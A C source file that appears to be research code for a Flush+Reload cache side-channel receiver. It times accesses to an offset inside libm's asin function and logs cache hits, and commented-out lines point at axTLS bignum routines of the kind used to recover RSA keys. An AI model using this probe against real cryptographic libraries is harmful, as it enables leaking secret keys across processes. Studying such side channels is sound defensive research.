#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <signal.h>

#include <math.h>

#define THRESHOLD 150

// TODO: change path and find offset in the target lib (libc?)
//#define LIBCRYPTO_PATH "axtls-code/_stage/libaxtls.so.1"
//#define LIBCRYPTO_SQUARE_FUNCTION "bi_square"
//#define LIBCRYPTO_SQUARE_OFFSET 0x80
//#define LIBCRYPTO_MULTIPLY_FUNCTION "bi_terminate"
//#define LIBCRYPTO_MULTIPLY_OFFSET 0x100
//#define LIBCRYPTO_BARRETT_FUNCTION "bi_subtract"
//#define LIBCRYPTO_BARRETT_OFFSET 0x78

#define LIBMATH_PATH "/lib64/libm.so.6"
#define LIBMATH_SINHF "asin" //"__sinhf_finite"
#define LIBMATH_SINHF_OFFSET 0x42 //0x448a0-0x448bd

#define NONE 0
#define SQUARE 1
#define MULTIPLY 2

#define RESULTS_SIZE 1024*1024

unsigned char *results;
pthread_mutex_t stopMutex;
int stop_probing = 0;

/* utils functions */
static void error(const char * format, ...) {
	va_list myargs;
	va_start(myargs, format);
	printf("[\033[31;1m!\033[0m] ");
	vprintf(format, myargs);
	printf("\n");
	exit(1);
}
static void info(const char * format, ...) {
	va_list myargs;
	va_start(myargs, format);
	printf("[\033[34;1m-\033[0m] ");
	vprintf(format, myargs);
	printf("\n");
}
static void ok(const char * format, ...) {
	va_list myargs;
	va_start(myargs, format);
	printf("[\033[32;1m+\033[0m] ");
	vprintf(format, myargs);
	printf("\n");
}


/* FLUSH + RELOAD probe function */
int probe(void *addr) {
	volatile unsigned long time;
	asm __volatile__ (
		" mfence \n"
		" lfence \n"
		" rdtsc \n"
		" lfence \n"
		" movl %%eax, %%esi \n"
		" movl (%1), %%eax \n"
		" lfence \n"
		" rdtsc \n"
		" subl %%esi, %%eax \n"
		" clflush 0(%1) \n"
		: "=a" (time)
		: "c" (addr)
		: "%esi", "%edx");
	if ( time < THRESHOLD ) {
		return 1;
	}
	return 0;
}


// TODO: change addresses
/* Probing thread */
void *probe_thread(void *arg) {
	char *dl_error;
	void *library = dlopen(LIBMATH_PATH, RTLD_NOW);
	if (!library) {
		error("dlopen failed: %s",dl_error);
	}

	void *sinhf = dlsym(library, LIBMATH_SINHF);
	if ((dl_error = dlerror()) != NULL)  {
		error("error in dlsym : %s",dl_error);
	}

	sinhf += LIBMATH_SINHF_OFFSET;

	memset(results, 0, RESULTS_SIZE);

	info("probe_thread started");
	info("LIB is at            %p", library);
	info("__sinhf_finite is at %p", sinhf);

    // TODO: receiver logic
	int pos = 0;
	while (1) {
		pthread_mutex_lock(&stopMutex);
		if ( stop_probing ) {
			break;
		}
		pthread_mutex_unlock(&stopMutex);

		int sinhf_seen = probe(sinhf);

		if (sinhf_seen) {
			results[pos]='S';
			pos++;
		}

		if (pos >= RESULTS_SIZE) {
			error("Need more space in results");
			break;
		}
	}
	info("Results len : %d",pos);
	pthread_exit(NULL);
}

int main(int argc, char **argv) {
	//if (argc != 3) {
	//	error("usage:  client <IP address> <port>");
	//}

	/* Prepare the result buffer */
	results = (unsigned char *)malloc(RESULTS_SIZE);
	if ( results == NULL ) {
		error("Error in malloc !");
	}

	/* Start the probing thread */
	pthread_t probe_t;
	if(pthread_create(&probe_t, NULL, probe_thread, NULL) == -1) {
		error("can't create probe thread");
	}

    // Wait to give time for the sender to do his job
    puts("[+] Waiting..");
    sleep(10);

	/* Stop the probing thread */
	pthread_mutex_lock(&stopMutex);
	stop_probing = 1;
	pthread_mutex_unlock(&stopMutex);
	pthread_cancel(probe_t);

	/* Write results (usefull for graph) */
	int result_fd = open("./results.bin",O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);
	if (result_fd < 0 ) {
		error("Cannot open output file for writting");
	}
	write(result_fd,results,strlen(results));
	close(result_fd);

	return EXIT_SUCCESS;
}
